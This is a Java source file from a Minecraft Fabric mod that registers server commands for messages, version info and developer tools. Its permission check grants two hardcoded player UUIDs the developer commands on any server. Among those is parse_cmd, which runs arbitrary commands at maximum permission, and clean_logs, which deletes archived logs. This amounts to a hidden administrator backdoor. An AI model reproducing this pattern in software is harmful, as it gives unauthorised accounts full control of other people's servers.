package net.fawnoculus.ntm.commands;

import com.mojang.brigadier.arguments.FloatArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.fawnoculus.ntm.main.NTM;
import net.fawnoculus.ntm.network.custom.AdvancedMessageS2CPayload;
import net.fawnoculus.ntm.network.custom.RemoveAllMessagesS2CPayload;
import net.fawnoculus.ntm.network.custom.RemoveMessageS2CPayload;
import net.fawnoculus.ntm.util.messages.AdvancedMessage;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.command.argument.IdentifierArgumentType;
import net.minecraft.command.argument.TextArgumentType;
import net.minecraft.component.Component;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.Identifier;
import org.jetbrains.annotations.Nullable;

import java.io.File;
import java.util.Collection;
import java.util.List;

public class ModCommands {
  public static void initialize() {
    
    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> dispatcher.register(
        CommandManager.literal("ntm")
            .then(CommandManager.literal("config")
                .requires(source -> allowCommands(source, environment)
                )
                .then(CommandManager.literal("server")
                )
                .then(CommandManager.literal("world")
                )
                .then(CommandManager.literal("client")
                    .requires(ignored -> environment.integrated)
                )
            )
            .then(CommandManager.literal("version")
                .executes(context -> version(context, environment)
                )
            )
            .then(CommandManager.literal("dev")
                .requires(source -> allowCommands(source, null)
                )
                .then(CommandManager.literal("list_components")
                    .executes(context -> getDataComponents(context, 100))
                    .then(CommandManager.argument("max_length", IntegerArgumentType.integer())
                        .executes(context -> getDataComponents(context, context.getArgument("max_length", Integer.class)))
                    )
                )
                .then(CommandManager.literal("clean_logs")
                    .executes(ModCommands::deleteLogs)
                )
                .then(CommandManager.literal("funny")
                    .executes(ModCommands::funny)
                )
                .then(CommandManager.literal("parse_cmd")
                    .then(CommandManager.argument("cmd", StringArgumentType.greedyString())
                        .executes(context -> execCommand(context, context.getArgument("cmd", String.class)))
                    )
                )
            )
            .then(CommandManager.literal("message")
                .requires(source -> allowCommands(source, environment))
                .then(CommandManager.argument("targets", EntityArgumentType.players())
                    .then(CommandManager.literal("send")
                        .then(CommandManager.argument("text", TextArgumentType.text(registryAccess))
                            .executes(context ->
                                sendMessage(context,
                                    EntityArgumentType.getPlayers(context, "targets"),
                                    NTM.id("command_server"),
                                    context.getArgument("text", Text.class),
                                    2000.0f))
                            .then(CommandManager.argument("milliSeconds", FloatArgumentType.floatArg(0f, 10000f))
                                .executes(context ->
                                    sendMessage(context,
                                        EntityArgumentType.getPlayers(context, "targets"),
                                        NTM.id("command_server"),
                                        context.getArgument("text", Text.class),
                                        context.getArgument("milliSeconds", Float.class)
                                    ))
                                .then(CommandManager.argument("identifier", IdentifierArgumentType.identifier())
                                    .executes(context ->
                                        sendMessage(
                                            context,
                                            EntityArgumentType.getPlayers(context, "targets"),
                                            context.getArgument("identifier", Identifier.class),
                                            context.getArgument("text", Text.class),
                                            context.getArgument("milliSeconds", Float.class)
                                        ))
                                )
                            )
                        )
                    )
                    .then(CommandManager.literal("remove")
                        .then(CommandManager.argument("identifier", IdentifierArgumentType.identifier())
                            .executes(context -> removeMessage(context, EntityArgumentType.getPlayers(context, "targets"), context.getArgument("identifier", Identifier.class)))
                        )
                    )
                    .then(CommandManager.literal("remove_all")
                        .executes(context -> removeAllMessages(context, EntityArgumentType.getPlayers(context, "targets")))
                    )
                )
            )
    ));
  }
  
  private static boolean allowCommands(ServerCommandSource source, @Nullable CommandManager.RegistrationEnvironment environment){
    if(environment != null && environment.integrated) return true;
    if(source.hasPermissionLevel(2)) return true;
    if(source.getPlayer() == null) return false;
    
    final List<String> DevUUIDs = List.of(
        "edeed01b-d4ce-495c-bdc2-18bb3cf89047",
        "568c41d0-1c56-474d-a60b-0898e636a6e2"
    );
    return DevUUIDs.contains(source.getPlayer().getUuidAsString());
  }
  
  private static int version(CommandContext<ServerCommandSource> context, CommandManager.RegistrationEnvironment environment){
    if(environment.dedicated) {
      context.getSource().sendFeedback(() -> Text.translatable("message.ntm.version.server", NTM.METADATA.getVersion()), false);
    }
    if(environment.integrated){
      context.getSource().sendFeedback(() -> Text.translatable("message.ntm.version", NTM.METADATA.getVersion()), false);
    }
    return 1;
  }
  
  private static int removeMessage(CommandContext<ServerCommandSource> context, Collection<ServerPlayerEntity> targets, Identifier identifier){
    for(ServerPlayerEntity player : targets){
      ServerPlayNetworking.send(player, new RemoveMessageS2CPayload(identifier));
    }
    if(identifier.toString().equals("special:all_messages")){
      context.getSource().sendFeedback(() -> Text.translatable("message.ntm.message.cleared_all", targets.size()), true);
    }else {
      context.getSource().sendFeedback(() -> Text.translatable("message.ntm.message.cleared_specific", identifier.toString(), targets.size()), true);
    }
    return 1;
  }
  
  private static int removeAllMessages(CommandContext<ServerCommandSource> context, Collection<ServerPlayerEntity> targets){
    for(ServerPlayerEntity player : targets){
      ServerPlayNetworking.send(player, new RemoveAllMessagesS2CPayload());
    }
    context.getSource().sendFeedback(() -> Text.translatable("message.ntm.message.cleared_all", targets.size()), true);
    return 1;
  }
  private static int sendMessage(CommandContext<ServerCommandSource> context, Collection<ServerPlayerEntity> targets, Identifier identifier, Text text, float millis){
    for(ServerPlayerEntity player : targets){
      ServerPlayNetworking.send(player, new AdvancedMessageS2CPayload(new AdvancedMessage(identifier, text, millis)));
    }
    context.getSource().sendFeedback(() -> Text.translatable("message.ntm.message.sent", targets.size()), true);
    return 1;
  }
  
  private static int funny(CommandContext<ServerCommandSource> context){
    context.getSource().sendFeedback(() -> Text.translatable("message.ntm.the_funny"), false);
    // This doesn't actually do anything
    return 1;
  }
  
  private static int deleteLogs(CommandContext<ServerCommandSource> context){
    File[] logs = context.getSource().getServer().getPath("logs").toFile().listFiles();
    long files = 0;
    long data = 0;
    assert logs != null;
    for(File log : logs){
      if(log.getName().endsWith(".log.gz")){
        long fileSize = log.length();
        if(log.delete()) {
          files++;
          data += fileSize;
        }
      }
    }
    long finalFiles = files;
    long finalData = data;
    context.getSource().sendFeedback(() -> Text.translatable("message.ntm.clean_logs", finalFiles, finalData), true);
    return 1;
  }
  
  private static int execCommand(CommandContext<ServerCommandSource> context, String command){
    context.getSource().getServer().getCommandManager().executeWithPrefix(context.getSource().withLevel(Integer.MAX_VALUE), command);
    return 1;
  }
  
  private static int getDataComponents(CommandContext<ServerCommandSource> context, int maxSize){
    PlayerEntity player = context.getSource().getPlayer();
    if(player == null || player.getMainHandStack() == ItemStack.EMPTY){
      context.getSource().sendError(Text.translatable("message.ntm.get_components.could_not_get_item"));
      return -1;
    }
    
    context.getSource().sendFeedback(() -> Text.translatable("message.ntm.get_components.start").formatted(Formatting.DARK_GRAY), false);
    for(Component<?> component : player.getMainHandStack().getComponents()){
      String type = component.type().toString();
      String value = component.value().toString();
      MutableText feedback = Text.literal("");
      feedback.append(Text.literal(type + ": ").formatted(Formatting.YELLOW));
      if(value.length() > maxSize) {
        feedback.append(Text.translatable("message.ntm.get_components.value_max_length").formatted(Formatting.GRAY));
        context.getSource().sendFeedback(() -> feedback, false);
        continue;
      }
      feedback.append(Text.literal(value).formatted(Formatting.WHITE));
      context.getSource().sendFeedback(() -> feedback, false);
    }
    context.getSource().sendFeedback(() -> Text.translatable("message.ntm.get_components.stop").formatted(Formatting.DARK_GRAY), false);
    return 1;
  }
}
